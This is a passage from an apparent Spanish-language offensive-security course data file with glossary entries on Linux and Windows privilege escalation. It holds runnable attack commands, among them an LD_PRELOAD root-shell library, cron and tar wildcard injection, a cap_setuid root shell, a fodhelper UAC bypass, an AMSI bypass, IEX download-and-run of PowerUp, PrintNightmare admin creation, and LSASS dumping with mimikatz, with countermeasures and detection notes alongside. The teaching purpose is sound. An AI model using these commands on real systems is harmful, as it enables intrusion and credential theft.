      "Más allá de GTFOBins, hay clases de bugs sutiles en config Linux que llevan a privesc. Los principales:\n" +
      "\n**Sudo con env_keep dangerosos:**\n" +
      "\n**LD_PRELOAD:**\nSi `env_keep+=LD_PRELOAD` está en sudoers, el user puede precargar una .so maliciosa que se ejecuta como root:\n" +
      "```bash\n# Verificar\nsudo -l         # buscar env_keep=LD_PRELOAD\n\n# Exploit\ncat > /tmp/x.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0); setuid(0);\n    system(\"/bin/bash\");\n}\nEOF\ngcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\nsudo LD_PRELOAD=/tmp/x.so cualquier-comando   # root shell\n```\n" +
      "\n**LD_LIBRARY_PATH:**\nSimilar, pero manipula qué library se carga.\n" +
      "\n**PYTHONPATH:**\nSi sudo permite ejecutar un script Python + `env_keep+=PYTHONPATH`, colocá un módulo malicioso con el mismo nombre:\n" +
      "```python\n# En /tmp/os.py\nimport subprocess; subprocess.call(['/bin/bash'])\n```\n```bash\nsudo PYTHONPATH=/tmp /path/to/legit_script.py\n```\n" +
      "\n**Sudo path hijacking (env_keep+=PATH):**\nMenos común pero explotable.\n" +
      "\n**Sudo con NOPASSWD y `!requiretty` (histórico):**\n\n**CVE-2021-3156 (Sudo Baron Samedit, enero 2021):**\nBug de heap overflow en sudo que afectaba **casi toda instalación Linux** (versiones 1.8.2-1.9.5p1). Explotable **sin necesidad de sudo permission previo** — el bug es en el parsing.\n" +
      "```bash\nsudoedit -s /   # crash bug de sudo\n```\nExploits públicos derivan root shell.\n" +
      "\n**Cron injection avanzado:**\n\n**Script writable con cron root:**\n```bash\n# /etc/crontab tiene:\n* * * * * root /home/user/backup.sh\n\n# Si backup.sh es writable por 'user' (permission bug):\necho 'chmod +s /bin/bash' >> /home/user/backup.sh\n# Esperar 1 min → /bin/bash es SUID root\n/bin/bash -p    # root shell (heredando UID)\n```\n" +
      "\n**Writable PATH que cron usa:**\n```bash\n# /etc/crontab tiene PATH que incluye /home/user/bin ANTES de /usr/bin\n# * * * * * root /some/script.sh (que usa 'ls' sin ruta)\n\necho '#!/bin/bash\\nchmod +s /bin/bash' > /home/user/bin/ls\nchmod +x /home/user/bin/ls\n# Cron corre 'ls' → tu 'ls' malicioso corre como root\n```\n" +
      "\n**Wildcard injection (`*` en scripts):**\nSi un script como root hace `tar -cf backup.tar *` en un directorio writable:\n```bash\n# En el dir writable\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh runme.sh'\necho '/bin/sh' > runme.sh\nchmod +x runme.sh\n# Cuando el cron corre 'tar -cf backup.tar *':\n# Se expande a 'tar -cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh runme.sh <resto>'\n# → RCE como root\n```\nAplicable a: `tar`, `rsync`, `chown`, `chmod`, cualquier command que use wildcards con args.\n" +
      "\n**Rsync wildcard:**\n```bash\ntouch -- '-e sh runme.sh'\n# rsync -av * remote: → ejecuta runme.sh como root\n```\n" +
      "\n**chown recursivo:**\n```bash\n# En dir writable\nln -s /etc/shadow rootfile\n# root luego hace chown user:user rootfile → chown -h no dereferences → chown recursivo sí\n```\n" +
      "\n**PATH inheritance de daemons:**\nAlgunos daemons (Apache, PHP-FPM) heredan PATH de su init. Si un include ejecuta `system('echo')` sin ruta y hay un PATH writable → hijack.\n" +
      "\n**NFS con no_root_squash:**\nMount NFS con `no_root_squash` permite que root del cliente escriba como root en el share.\n" +
      "```bash\n# Cliente monta remote NFS con root_squash desactivado\nmount -t nfs server:/share /mnt\n# Copiar SUID bash al share\ncp /bin/bash /mnt/rootbash\nchmod +s /mnt/rootbash\n# En el servidor NFS, /rootbash es SUID root → shell root\n```\n" +
      "\n**Contramedidas:**\n" +
      "• **Nunca env_keep=LD_PRELOAD** en sudoers.\n" +
      "• **Absolute paths** en cron scripts + sanitizar wildcards (`--`).\n" +
      "• **Permisos strict** en scripts de cron (owned by root, not writable).\n" +
      "• **NFS con `root_squash`** siempre.\n" +
      "• **sudo `!requiretty` off** salvo casos específicos.\n" +
      "> 💡 **CVE-2021-3156 Baron Samedit** fue apocalipsis-level — un local user con shell podía escalar en 100% de Linuxes.\n" +
      "> ⚠️ Wildcard injection es **subtle** — el 90% de sysadmins no lo sabe. Frecuente en homelab/small business.",
    examples: [
      "OSCP: sudo env_keep+=LD_PRELOAD en 30% de labs de privesc.",
      "Wildcard injection en cron `chown` — CTF classic.",
      "Baron Samedit (CVE-2021-3156): impacto masivo en enero 2021.",
    ],
    related: ["Sudo, cron y PATH hijacking", "GTFOBins y binarios abusables", "Bits especiales SUID/SGID/sticky", "LinPEAS, LinEnum y pspy"],
  },
  {
    id: 348,
    module: 31,
    term: "Linux capabilities y namespaces exploitation",
    short: "Capabilities granulan root. Un binary con cap_setuid es efectivo SUID. cap_dac_read_search lee todo. cap_sys_admin es casi root.",
    detail:
      "Las **Linux capabilities** (POSIX capabilities) subdividen root en ~40 permisos granulares. Cada capability puede asignarse a binaries, threads, o procesos. Mal asignadas, dan escalada.\n" +
      "\n**Enumeración:**\n" +
      "```bash\n# Todos los binaries con capabilities en el system\ngetcap -r / 2>/dev/null\n\n# Capabilities del proceso actual\ncapsh --print\n\n# Capabilities de un proceso específico\ncat /proc/<pid>/status | grep Cap\n```\n" +
      "\n**Formato de output:**\n```\n/usr/bin/python3.11 = cap_setuid+ep\n```\n• **cap_setuid** — la capability.\n• **+ep** — flags: e=effective, p=permitted, i=inheritable.\n\n" +
      "\n**Capabilities peligrosas comunes:**\n\n**cap_setuid+ep:**\n```bash\ngetcap /usr/bin/python3\n# → cap_setuid+ep\n\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# → root shell\n```\nEl proceso puede llamar `setuid(0)` sin ser root. Efectivo SUID pero más difícil de detectar.\n" +
      "\n**cap_dac_read_search+ep:**\n\"Read any file, bypass all DAC\". Con este cap puedo leer `/etc/shadow`, private SSH keys, etc.\n" +
      "```bash\ngetcap /usr/bin/tar → cap_dac_read_search+ep\ntar cf /tmp/shadow.tar /etc/shadow\n```\n\n**cap_dac_override+ep:**\nSimilar pero write también.\n\n**cap_sys_admin+ep:**\nCasi equivalente a root. Permite mount, load modules, otras 20+ operaciones. Regularmente escalable a root full.\n" +
      "```bash\n# Con cap_sys_admin en un binary\n# Mount bind del rootfs para modificar como user:\nmount --bind /etc /tmp/etc-hijack\n# Modificar /etc/passwd via /tmp/etc-hijack\n```\n\n**cap_net_admin+ep:**\nManipula config de red. Puede sniffing con NFQUEUE, iptables rules, etc.\n\n**cap_sys_ptrace+ep:**\nAttach a otros procesos con ptrace → dump memoria, inject shellcode.\n" +
      "```bash\ngdb -p <pid_del_proceso_privileged>\ncall system(\"chmod +s /bin/bash\")\n```\n" +
      "\n**cap_chown+ep:**\nCambiar ownership de cualquier file. Útil para chown /etc/shadow → own, then edit.\n" +
      "\n**cap_setgid+ep:**\nSimilar a setuid pero GID. Menos crítico pero escalable con group memberships.\n" +
      "\n**Namespace exploitation:**\n\n**User namespaces (introduced en kernel 3.8):**\nUn proceso puede crear su propio namespace donde es \"root\" **dentro** del namespace (mapped a user UID afuera). Puede tener capabilities dentro del namespace.\n\n**Exploit clásico:** dentro del user namespace tenés cap_sys_admin, con mount para escapar:\n" +
      "```bash\nunshare -U -r bash    # user namespace, mapped to root inside\n# Now root inside\n# Múltiples CVEs históricos permitían escape\n```\n\n**CVE-2022-0185 (Filesystem Context):** user namespace + FSCONTEXT bug → root escape.\n\n**CVE-2021-3493 (OverlayFS + user_ns):** overlay + user namespace → LPE en Ubuntu.\n\n**PID namespaces:**\nEscape common si el container no isola pid namespace correctamente. Ver PIDs del host → attach.\n\n**Network namespaces:**\nPor sí solo no escalable, pero combinado con capabilities → sniffing sobre el host.\n\n**Mount namespaces:**\nBind mount de `/` del host dentro de un container comprometido = full read access.\n" +
      "\n**Setpriv / capsh alternative:**\n```bash\nsetpriv --inh-caps=+setuid --ambient-caps=+setuid ...\n```\nAmbient capabilities (kernel 4.3+) heredan capabilities entre execve.\n" +
      "\n**Contramedidas:**\n" +
      "• **`getcap -r / 2>/dev/null | grep -v '^$'`** en auditoría — nada debería tener cap_setuid, cap_dac_read_search, cap_sys_admin sin razón fuerte.\n" +
      "• **Minimum caps** — servicios deberían drop caps a lo mínimo (systemd `CapabilityBoundingSet=`).\n" +
      "• **sysctl -w kernel.unprivileged_userns_clone=0** — desactiva user namespaces (Ubuntu default post-CVE-2022-0185 in some kernels).\n" +
      "• **SELinux/AppArmor** profiles que restringen incluso a root.\n" +
      "• **AuditD** rules on capability-granting binaries execution.\n" +
      "> 💡 `getcap -r /` es el primer check post-shell después de SUID enum. Muchas escaladas modernas viven acá.\n" +
      "> ⚠️ Capabilities son **más difíciles de detectar** que SUID — no aparecen en `find -perm -4000`. LinPEAS los cubre por default.",
    examples: [
      "OSCP: Python con cap_setuid+ep = escalada instant. Aparecía en 20% de labs.",
      "Kubernetes escape 2022 (CVE-2022-0185): user namespace + FSCONTEXT.",
      "gdb con cap_sys_ptrace attach a systemd → escalada.",
    ],
    related: ["Sudo, cron y PATH hijacking", "GTFOBins y binarios abusables", "Kernel exploits y container escape", "LinPEAS, LinEnum y pspy"],
  },

  // ── M32 · Escalada de Privilegios: Windows ───────────────────────────────
  {
    id: 350,
    module: 32,
    term: "Enumeración (WinPEAS/PowerUp)",
    short: "Mapear el host Windows en busca de misconfiguraciones que escalen a SYSTEM.",
    detail:
      "Como en Linux, la escalada empieza enumerando: privilegios del token, servicios, parches faltantes, credenciales guardadas. **WinPEAS** (y **PowerUp** en PowerShell) automatizan la búsqueda de vectores.\n" +
      "whoami /priv\n" +
      "> 💡 `whoami /priv` revela privilegios abusables como SeImpersonatePrivilege (puerta a los ataques Potato).",
    examples: [
      "WinPEAS resaltando un servicio con permisos débiles.",
      "PowerUp's Invoke-AllChecks para un barrido rápido.",
    ],
    related: ["Token impersonation y Potato", "Servicios vulnerables", "Defender, AMSI y ETW"],
  },
  {
    id: 351,
    module: 32,
    term: "Token impersonation y Potato",
    short: "Abusar de SeImpersonatePrivilege para suplantar el token de SYSTEM.",
    detail:
      "Si una cuenta de servicio tiene **SeImpersonatePrivilege**, la familia de ataques **Potato** (JuicyPotato, RoguePotato, PrintSpoofer) la usa para **suplantar el token de SYSTEM** y escalar. Es uno de los caminos más comunes desde un servicio web/SQL comprometido.",
    examples: [
      "PrintSpoofer convirtiendo SeImpersonate en SYSTEM.",
      "JuicyPotato en versiones de Windows más antiguas.",
    ],
    related: ["Enumeración (WinPEAS/PowerUp)", "Servicios vulnerables", "Servicios y procesos"],
  },
  {
    id: 352,
    module: 32,
    term: "Servicios vulnerables",
    short: "Rutas sin comillas, permisos débiles y AlwaysInstallElevated permiten escalar.",
    detail:
      "Misconfiguraciones de servicios muy explotadas:\n" +
      "• **Unquoted service path** — una ruta con espacios sin comillas permite colocar un binario malicioso que se ejecuta como SYSTEM.\n" +
      "• **Permisos débiles** — poder modificar el binario o la config de un servicio.\n" +
      "• **AlwaysInstallElevated** — instala MSIs como SYSTEM.\n" +
      "• **DLL hijacking** — colocar una DLL que el servicio carga.",
    examples: [
      "C:\\Program Files\\app vuln.exe → plantar 'Program.exe'.",
      "AlwaysInstallElevated habilitado → MSI malicioso como SYSTEM.",
    ],
    related: ["Token impersonation y Potato", "Enumeración (WinPEAS/PowerUp)", "Servicios y procesos"],
  },
  {
    id: 353,
    module: 32,
    term: "Mimikatz y robo de credenciales",
    short: "Volcar contraseñas, hashes y tickets de la memoria de Windows.",
    detail:
      "Tras escalar a admin/SYSTEM, **Mimikatz** vuelca credenciales de la memoria de **LSASS**: contraseñas en claro, hashes NTLM y tickets Kerberos. Habilita **Pass-the-Hash** y **Golden Ticket** para el movimiento lateral.\n" +
      "> 💡 **Credential Guard** y proteger LSASS dificultan estos volcados.",
    examples: [
      "sekurlsa::logonpasswords para volcar credenciales.",
      "Robar un hash NTLM para Pass-the-Hash a otra máquina.",
    ],
    related: ["Token impersonation y Potato", "Ataques a Active Directory", "Movimiento lateral"],
  },
  {
    id: 354,
    module: 32,
    term: "WinPEAS, PowerUp y Seatbelt",
    short: "Automated enumeration para Windows privesc. WinPEAS con highlighting, PowerUp para PowerShell nativo, Seatbelt para .NET granular.",
    detail:
      "Similar a LinPEAS en Linux, Windows tiene tres herramientas dominantes de enum post-shell.\n" +
      "\n**WinPEAS (Peass-ng):**\nEl estándar para escalada Windows. Binary standalone .exe o .bat.\n" +
      "```powershell\n# Descargar (host con AV desactivado o path bypass)\ncurl.exe -o winPEAS.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe\n.\\winPEAS.exe\n\n# Modo específico\n.\\winPEAS.exe systeminfo\n.\\winPEAS.exe applicationsinfo\n.\\winPEAS.exe filesinfo\n```\n" +
      "\n**Checks cubiertos** (200+):\n• System info + patchlist → CVE lookups\n• Users, groups, memberships\n• Sessions activas (whoami /priv, /groups)\n• Services (unquoted paths, weak permissions, DLL hijacking candidates)\n• Scheduled tasks writable\n• Registry keys interesantes (AlwaysInstallElevated, autologon, PuTTY sessions, WinSCP)\n• AppLocker/UAC config\n• Anti-virus + EDR product detection\n• Credentials en filesystem (unattend.xml, sysprep, PowerShell history, browser passwords)\n• NTLM/Kerberos tickets in memory\n• Cached passwords + LSA secrets\n\n**Color highlights:**\n• 🔴 RED — vulnerable/explotable\n• 🟡 YELLOW — interesting\n• 🔵 BLUE — informational\n\n**PowerUp (PowerShell, PowerSploit legacy pero mantenido):**\nEnfocado en service misconfigurations + registry paths + PATH abuse. Ideal cuando ya tenés PowerShell disponible sin necesidad de dropar binary.\n" +
      "```powershell\n# Import\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')\n\n# All checks\nInvoke-AllChecks\n\n# Individual\nGet-UnquotedService\nGet-ModifiableServiceFile\nGet-RegistryAlwaysInstallElevated\nGet-ModifiablePath -Path $env:PATH\n```\n**AMSI-detected en Defender moderno** — requiere bypass previo.\n" +
      "\n**Seatbelt (C# / .NET):**\nDe SpecterOps. Modo defensivo Y ofensivo — 60+ checks. Más granular que WinPEAS. Requiere compilar o dropar `.exe`.\n" +
      "```\nSeatbelt.exe -group=all              # todos los checks\nSeatbelt.exe DNSCache DomainSessions\nSeatbelt.exe -group=user LoggedOnUsers\n```\n\n**Checks únicos Seatbelt:**\n• `RDPSavedConnections` — hosts guardados en RDP client\n• `PuttySSH` — sesiones PuTTY con creds\n• `SecPackageCredentials` — credenciales cached en Credential Manager\n• `WindowsCredentialFiles` — DPAPI-protected creds parseables offline con SharpDPAPI\n• `IEUrls` — history browser\n• `SysmonSettings` — detectar si Sysmon está deployado\n\n**Complementarias:**\n\n**SharpUp** — port de PowerUp a C# / .NET. Menos AMSI-detectable que PowerShell.\n\n**BeRoot / Watson** — específicos para kernel exploits Windows (uname → CVE lookup).\n\n**PrivescCheck** (PowerShell):\nMás nuevo (2020). Excelente report HTML.\n```powershell\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1')\nInvoke-PrivescCheck -Extended -Report result.html -Format HTML\n```\n\n**Workflow OSCP típico Windows:**\n```\n1. whoami /priv /groups /all       (1 min)\n2. .\\winPEAS.exe                    (5 min, generate output)\n3. PrivescCheck.ps1 → HTML report  (backup en case AMSI kills)\n4. Buscar patrones en output:\n   - SeImpersonatePrivilege → Potato family\n   - Unquoted service path writable → binary planting\n   - AlwaysInstallElevated → MSI privilege exec\n   - Insecure service permissions → sc config binPath\n```\n\n**Bypass AMSI para ejecutar PowerShell tools:**\n```powershell\n# Classic (muy signaturado)\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Nuevas técnicas: hardware breakpoints, memory patching via P/Invoke\n```\n\n**Contramedidas defender:**\n• **Sysmon con SwiftOnSecurity ruleset** — detecta ejecución de peass, powersploit, etc.\n• **AMSI habilitado + logging (Event 4104)** — captura scripts PowerShell y contenido pre-execution.\n• **Defender for Endpoint / EDR moderno** — detecta patrones de enum masivo.\n• **AppLocker/WDAC** — allowlist de ejecutables permitidos.\n" +
      "> 💡 En 2024, **AMSI + Defender for Endpoint** hacen de PowerUp legacy muy difícil de correr sin bypass previo. Seatbelt/SharpUp compilados custom son alternativas.\n" +
      "> ⚠️ WinPEAS.exe es **detected instantly** por casi todo AV. Compilar variantes con signature evasion o correr en memoria (Invoke-Expression + WebClient).",
    examples: [
      "OSCP: `.\\winPEAS.exe` es first-step tras shell as user en Windows lab.",
      "SpecterOps SharpUp: reemplazo C# de PowerUp para AMSI evasion.",
      "PrivescCheck: HTML report + integrated CVE checks. Muy usado por consultores.",
    ],
    related: ["Primitivas de escalada", "Token impersonation y Potato", "AV/EDR evasion moderna: AMSI, ETW, syscall directas", "PowerShell ofensivo"],
  },
  {
    id: 355,
    module: 32,
    term: "Potato family: SeImpersonatePrivilege abuse",
    short: "Hot/Rotten/Juicy/Rogue/PrintSpoofer/GodPotato — 10+ años de exploits que abusan SeImpersonatePrivilege para escalar a SYSTEM.",
    detail:
      "Los ataques 'Potato' son una familia de exploits que abusan del privilege **SeImpersonatePrivilege** (asignado por default a IIS/MSSQL/services accounts) para escalar a SYSTEM. La familia evoluciona desde 2016 con updates por Windows patches.\n" +
      "\n**Contexto:**\nSi tenés shell como IIS AppPool user, MSSQL service account, o similar, seguramente tenés:\n" +
      "```powershell\nwhoami /priv\n# SeImpersonatePrivilege     State: Enabled\n# SeAssignPrimaryTokenPrivilege  (a veces)\n```\nEsto permite **impersonate** cualquier token que se te presente. La técnica Potato es forzar que un servicio SYSTEM se autentique **hacia tu proceso** → capturás su token → impersonate → SYSTEM shell.\n" +
      "\n**Timeline de la familia:**\n\n**Hot Potato (2016):**\nRuben Boonen + Steven Vittitoe. Primera versión. Combina NBNS spoofing + WPAD + local NTLM relay. Complejo, sólo Win 7-8. Deprecado.\n" +
      "\n**Rotten Potato (2016):**\nStephen Breen (Foxglove). Simplificación: abusa DCOM local para forzar auth SYSTEM a nuestro RPC listener local. Win 7-2016.\n" +
      "\n**Lonely Potato (2017):**\nAdaptación de Rotten para bypass de session isolation.\n" +
      "\n**Juicy Potato (2018):**\nOhpe. Fork mejorado de Rotten. Soporte para custom CLSID (BITSv3, etc). El más usado en OSCP históricamente.\n" +
      "```powershell\n# Juicy Potato requiere OXID resolver visible\n.\\JuicyPotato.exe -l 8888 -p c:\\windows\\system32\\cmd.exe -a \"/c calc.exe\" -t *\n```\n**Muerto en Win 10 1809+** (Microsoft patched OXID resolver behavior).\n" +
      "\n**Rogue Potato (2020):**\nAntonio Cocomazzi. Bypass del patch de Juicy usando fake OXID resolver **externo** (necesita otro server accesible en la red).\n" +
      "```powershell\n.\\RoguePotato.exe -r 10.10.10.5 -e \"cmd.exe /c calc.exe\" -l 9999\n# 10.10.10.5 = otro host con socat listening (redirect a un evil OXID resolver del atacante)\n```\n\n**PrintSpoofer (2020):**\nItm4n. Abusa el Print Spooler service (SYSTEM) via named pipe. Sin necesidad de OXID externo. **Silver bullet moderno.**\n```powershell\n.\\PrintSpoofer.exe -i -c \"cmd.exe\"\n# -i: interactive shell as SYSTEM\n```\nRequiere Print Spooler running (default en Win 10, opt-in en Server post-PrintNightmare).\n\n**GodPotato (2023):**\nBugChecker. Similar a PrintSpoofer pero usa RPC/DCOM en vez de Print Spooler → funciona **incluso con Spooler deshabilitado**. Best current option.\n```powershell\n.\\GodPotato.exe -cmd \"cmd.exe /c calc.exe\"\n```\n\n**SweetPotato:**\nMeta-tool que auto-selecciona entre PrintSpoofer/Rogue/Juicy según lo que funciona en el target.\n\n**RemotePotato0:**\nCross-session (roba token de un user logueado en otra session RDP, incluyendo Domain Admin).\n\n**Mecánica interna común:**\n1. Attacker con SeImpersonate corre payload.\n2. Trigger — hace que un servicio SYSTEM abra una connection al proceso attacker (via RPC, Print Spooler, WSMan, DCOM).\n3. El proceso attacker captura el token en el handshake.\n4. `DuplicateTokenEx` → `CreateProcessWithTokenW` con el token capturado.\n5. New process runs as SYSTEM.\n\n**Detección (blue team):**\n• **Sysmon Event 1** — creación de procesos hijos con SYSTEM privileges desde un IIS/MSSQL parent.\n• **Sysmon Event 3** — connections outbound raras del web app process.\n• **Windows Security Event 4624** logon type 9 (NewCredentials) desde servicios locales.\n• **EDR moderno** detecta patrones RPC/DCOM anómalos.\n• **Print Spooler logging** — Windows Event 316 desde Microsoft-Windows-PrintService/Operational.\n\n**Contramedidas:**\n• **Quitar SeImpersonatePrivilege** de service accounts (no siempre posible).\n• **Deshabilitar Print Spooler** en servers que no imprimen.\n• **Deshabilitar WebClient service** — cierra un vector adicional (`\\localhost\\...`).\n• **Least privilege service accounts** — no correr IIS como user con Impersonate si no se necesita.\n> 💡 En 2024, **GodPotato** es el go-to. PrintSpoofer y Juicy son legacy pero sirven en labs viejas.\n> ⚠️ Todos los Potato son **flagged por Defender** con signatures. Compilar variantes custom o correr in-memory con reflective loading.",
    examples: [
      "OSCP legacy: Juicy Potato en Server 2016 era 90% de los casos IIS.",
      "GodPotato 2023: cubre Windows 8-11 + Server 2012-2022, PrintSpoofer no cubría Server 2022 hardened.",
      "Real world: web shell PHP con IIS user → GodPotato → SYSTEM → mimikatz.",
    ],
    related: ["Token impersonation y Potato", "Primitivas de escalada", "PowerShell ofensivo", "Servicios vulnerables"],
  },
  {
    id: 356,
    module: 32,
    term: "UAC bypass moderno + Registry hijacking",
    short: "fodhelper, computerdefaults, sdclt, DiskCleanup — abuso de auto-elevate binaries + registry redirection. Cambia con cada Windows release.",
    detail:
      "**UAC** (User Account Control) es la feature de Windows que separa el 'user token' del 'admin token' incluso cuando el user es Local Administrator. Un binary auto-elevate corre como admin sin prompt; un user process corre como medium integrity.\n" +
      "\nUAC bypass = ejecutar código con integrity high (admin) desde medium integrity **sin UAC prompt**. No es LPE (ya sos admin), pero es útil para ejecutar payloads con full admin rights sin interacción del user.\n" +
      "\n**Concepto core: auto-elevate binaries:**\nWindows tiene ~10 binaries con `autoElevate=true` en su manifest. Corren como high integrity automáticamente. Si esos binaries **leen registry keys** que el user medium puede escribir, controlar qué se ejecuta.\n" +
      "\n**fodhelper.exe (Features on Demand):**\nEl más famoso. Lee `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`:\n```powershell\n# Setup registry redirect\nNew-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'cmd.exe /c calc.exe'\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value ''\n\n# Trigger\nStart-Process 'C:\\Windows\\System32\\fodhelper.exe'\n# → calc.exe runs high integrity, sin prompt UAC\n```\n\n**computerdefaults.exe:**\nMismo mecanismo. Sirve como backup si fodhelper es deshabilitado.\n" +
      "\n**sdclt.exe (Backup):**\nHKCU\\Software\\Classes\\Folder\\shell\\open\\command → auto-elevate.\n**Patched en Windows 10 1809+** (rara vez funciona post-2018).\n\n**DiskCleanup (via ScheduledTask):**\nSilentCleanup scheduled task tiene highest privileges. Un env var expandido en el path del task → hijack.\n\n**eventvwr.exe (Event Viewer):**\nLee `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command`. Uno de los primeros documentados (2016).\n\n**wsreset.exe:**\nWindows Store reset. Lee HKCU keys de Store schema.\n\n**Otras 2023-2024:**\n• **cleanmgr.exe** con XML config\n• **CompMgmtLauncher.exe**\n• **AppUninstaller.exe**\n\n**UACME repo (hfiref0x):**\ngithub.com/hfiref0x/UACME — catálogo de 78+ técnicas de UAC bypass. Cada release Windows patches algunas → new ones surface.\n\n**Bypass sin registry (más stealth):**\n\n**Token duplication desde high-integrity process:**\nSi un proceso high-integrity ya corre y tenés SeDebugPrivilege → open handle → duplicate token → CreateProcessWithTokenW.\n\n**DLL sideloading en high-integrity dirs:**\nColocar DLL en `C:\\Windows\\System32\\` (write requires admin, pero via UAC bypass o admin write en subdirs) → binary auto-elevate carga la DLL.\n\n**COM Interface abuse (Cortana, Bluetooth):**\nElevatedCOMinterface accesible desde medium integrity. `IColorDataProxy`, `ICMLuaUtil` han sido usados.\n\n**Empire / Metasploit modules:**\n```\n# Metasploit\nuse exploit/windows/local/bypassuac_fodhelper\nuse exploit/windows/local/bypassuac_dotnet_profiler\nuse exploit/windows/local/bypassuac_eventvwr\n```\n\n**Contramedidas:**\n• **UAC = Always Notify** (max slider) → algunos bypasses fallan pero no todos.\n• **AppLocker/WDAC** — allowlist de qué puede correr en high integrity.\n• **LAPS** — random local admin password, rotated → aunque bypass funcione, less impact.\n• **Attack Surface Reduction (ASR) rules** — bloquean patterns de bypass.\n• **Windows Defender Credential Guard** protege contra dump post-bypass.\n• **Application Guard** aislar apps de alto riesgo.\n\n**Blue team detection:**\n• **Sysmon Event 12/13/14** — Registry set en paths conocidos de bypass (`ms-settings\\Shell`).\n• **Sysmon Event 1** — auto-elevate binaries corriendo con parent unexpected.\n• **AutoElevate audit** con Sysinternals SysMonitor.\n> 💡 UAC bypass es útil para **stealth ops** (evitar prompt visible), pero NO es privilege escalation clásica — ya sos admin.\n> ⚠️ Cada Windows Feature Update (11 22H2, 24H2) patches 3-5 bypasses. Verificar UACME antes de asumir uno funciona.",
    examples: [
      "UACME: 78 técnicas catalogadas, community-maintained.",
      "Red team: fodhelper para ejecutar Cobalt Strike beacon con high integrity sin UAC popup.",
      "Blue team: Sysmon rule sobre HKCU\\Software\\Classes\\ms-settings creation detecta trivialmente.",
    ],
    related: ["Primitivas de escalada", "AV/EDR evasion moderna: AMSI, ETW, syscall directas", "PowerShell ofensivo", "Registro de Windows"],
  },
  {
    id: 357,
    module: 32,
    term: "PrintNightmare, DPAPI y LSASS dumping",
    short: "CVE-2021-34527 (PrintNightmare) → RCE con user. DPAPI vaults + LSASS dumping para credenciales — vectors críticos post-compromise.",
    detail:
      "Tres vectores separados pero relacionados por explotar internals de Windows.\n" +
      "\n**PrintNightmare (CVE-2021-1675 + CVE-2021-34527, junio 2021):**\nBug en Print Spooler que permite **cualquier user autenticado del dominio agregar una impresora con driver malicioso**. El driver install runs como SYSTEM → RCE.\n\n**Impact scope:**\n• Local privilege escalation (user → SYSTEM local).\n• **Remote code execution en cualquier server con Spooler** — DCs incluidos.\n• Vector para dominio compromise (RCE en DC).\n\n**Exploit primario:**\n```powershell\n# CVE-2021-1675 - local privesc via Point-and-Print\n# CVE-2021-34527 - remote via SMB path a driver malicioso\n\n# Impacket (Python)\npython3 CVE-2021-1675.py CORP.LOCAL/user:pass@target '\\\\attacker\\\\share\\\\evil.dll'\n\n# Windows (PowerShell)\nImport-Module .\\CVE-2021-1675.ps1\nInvoke-Nightmare -DriverName 'PrintNightmare' -NewUser 'attacker' -NewPassword 'Passw0rd!'\n# Crea local admin\n```\n\n**Windows patched múltiples veces** (JuI 2021, ago 2021, sep 2021, feb 2022). Cada patch fue bypassable brevemente.\n\n**Fix definitivo:**\n• Deshabilitar Point-and-Print para non-admins: `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint`\n• Deshabilitar Print Spooler donde no se necesita (DCs, file servers).\n" +
      "\n**DPAPI (Data Protection API):**\nAPI de Windows que cifra datos sensibles per-user o per-machine. Usa keys derivadas del password del user (o machine key). Muchas apps guardan credentials via DPAPI:\n\n• Chrome/Edge saved passwords\n• Outlook profiles\n• PuTTY sessions (RegEdit encrypted values)\n• WinSCP saved connections\n• Windows Credential Manager entries\n• Windows Vault (Wi-Fi passwords, etc.)\n• RDP saved credentials\n\n**DPAPI attack (offline con MASTERKEY + user password):**\n```powershell\n# 1. Enumerar\nSharpDPAPI.exe blob    # lista DPAPI blobs\nSharpDPAPI.exe rdcman   # RDP Manager saved creds\nSharpDPAPI.exe machine  # machine-scoped DPAPI\nSharpDPAPI.exe backupkey /server:dc.corp.local /pvk:key.pvk  # domain backup key (needs DA)\n\n# 2. Decrypt with domain backup key\nSharpDPAPI.exe triage /pvk:backupkey.pvk\n```\n\n**mimikatz DPAPI:**\n```\nmimikatz # dpapi::cache\nmimikatz # dpapi::masterkey /in:\"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\<masterkey>\" /rpc\n```\n\n**LSASS dumping:**\nLSASS.exe mantiene en memoria: passwords cleartext (WDigest si habilitado), NTLM hashes, Kerberos tickets, Windows Credentials, etc.\n\n**Herramientas:**\n\n**Task Manager (basic):**\n```\nRight click LSASS.exe → Create dump file\n# Salida: C:\\Users\\...\\AppData\\Local\\Temp\\lsass.DMP\n```\n\n**procdump (Sysinternals, comúnmente whitelisted):**\n```powershell\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n**comsvcs.dll (living-off-the-land):**\n```powershell\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> C:\\temp\\lsass.dmp full\n```\n\n**PPLDump / PPLFault / PPLBlade:**\nCuando LSASS es **Protected Process Light (PPL)** — enabled en Win 8.1+ con Credential Guard. Estos bypasses attack la protection.\n\n**Nanodump (SpecterOps):**\nDump minimal (solo Wdigest/NTLM), evade signature.\n\n**Análisis offline del dump con mimikatz:**\n```\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n# Output: NTLM hashes, Wdigest passwords, Kerberos tickets\n```\n\n**Detección (blue 